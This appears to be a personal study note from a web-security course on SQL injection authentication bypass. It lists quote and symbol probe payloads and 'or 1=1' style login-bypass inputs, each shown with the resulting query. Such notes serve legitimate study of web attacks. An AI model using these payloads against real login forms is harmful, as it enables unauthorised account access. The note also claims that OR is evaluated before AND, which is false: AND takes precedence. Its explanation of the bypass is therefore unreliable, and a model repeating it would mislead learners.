---
title: c-Subvert Query Logic
draft: false
tags:
---
Let's run how to modify the original query's logic by injecting the `OR` operator and using SQL comments. 

A basic example of this is bypassing web authentication.

## Authentication Bypass

Let's say on login form uses following SQL query for authenthentication:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

## SQLi Discovery

Let's first test if the login form is vulnerable to SQL injection.

To do that, let's add one of the below payloads after our username and see if it causes any error:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

Let's say we injected `'` payload to the username form:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

We can see that there is an error because password is not handled correctly. 

## OR Injection

We need the query to always return true regardless of the username or password entered so that we can bypass authentication.

An example of condition that will always return true is `'1'='1'`.

We will use `'1'='1` so that we can keep even number of quotes.

If we inject the below condition:

```sql
admin' or '1'='1
```

Final query will be as follows:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

Above query will always result in `true` since `OR` operator is always processed before `AND` query.

What if we don't know the correct username?

We can inject `something' or '1'='1` as the password and it would work.

```sql
SELECT * FROM logins WHERE username='blah' or '1'='1' AND password = 'something' or '1'='1';
```